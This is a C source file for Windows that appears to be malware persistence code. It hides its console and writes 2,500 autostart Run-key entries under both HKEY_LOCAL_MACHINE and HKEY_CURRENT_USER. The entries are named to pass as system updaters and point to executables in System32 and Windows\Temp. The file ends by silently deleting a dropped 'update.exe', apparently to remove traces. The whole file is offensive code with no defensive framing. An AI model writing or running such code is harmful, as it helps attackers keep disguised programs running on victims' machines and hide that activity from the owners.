#include<windows.h>
#include<stdio.h>
int persistence(const char *reg_key, const char *value, char *key_name){
    HKEY key;
    LSTATUS rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(reg_key), 0, KEY_SET_VALUE, &key);
    if(ERROR_SUCCESS != rc){
        printf("RegOpenKeyEx failed: %u\n", GetLastError());
        RegCloseKey(key);
        return -1;
    }
    rc = RegSetValueEx(key, TEXT(key_name), 0, REG_SZ, (const BYTE*)value, (lstrlen(value)+1) * sizeof(TCHAR));
    if(ERROR_SUCCESS != rc){
        printf("RegSetValueExA failed: %u\n", GetLastError());
        RegCloseKey(key);
        return -1;
    }  
    rc = RegCloseKey(key);
    if(ERROR_SUCCESS != rc){
        printf("RegCloseKey failed: %u\n", GetLastError());
        return -1;
    }
    
    rc = RegOpenKeyEx(HKEY_CURRENT_USER, TEXT(reg_key), 0, KEY_SET_VALUE, &key);
    if(ERROR_SUCCESS != rc){
        printf("RegOpenKeyEx failed: %u\n", GetLastError());
        RegCloseKey(key);
        return -1;
    }
    rc = RegSetValueEx(key, TEXT(key_name), 0, REG_SZ, (const BYTE*)value, (lstrlen(value)+1) * sizeof(TCHAR));
    if(ERROR_SUCCESS != rc){
        printf("RegSetValueExA failed: %u\n", GetLastError());
        RegCloseKey(key);
        return -1;
    }  
    rc = RegCloseKey(key);
    if(ERROR_SUCCESS != rc){
        printf("RegCloseKey failed: %u\n", GetLastError());
        return -1;
    }
    return 0;
}
int main(){
    FreeConsole();
    for(int i = 1; i <= 2500; i++){
        char buf[250];
        char name_buf[250];
        if(i % 2 == 0){
            snprintf(buf, sizeof(buf), "C:\\Windows\\System32\\updater_%d.exe", i);
            snprintf(name_buf, sizeof(name_buf), "System_Updater_%d", i);
            persistence("Software\\Microsoft\\Windows\\CurrentVersion\\Run", buf, name_buf);
        }
        else{
            snprintf(buf, sizeof(buf), "C:\\Windows\\Temp\\windows_update_%d.exe", i);
            snprintf(name_buf, sizeof(name_buf), "Update_%d", i);
            persistence("Software\\Microsoft\\Windows\\CurrentVersion\\Run", buf, name_buf);
        }
       
    }
    WinExec("C:\\Windows\\System32\\cmd.exe /c del \"C:\\Windows\\Temp\\update.exe\"", 0);

}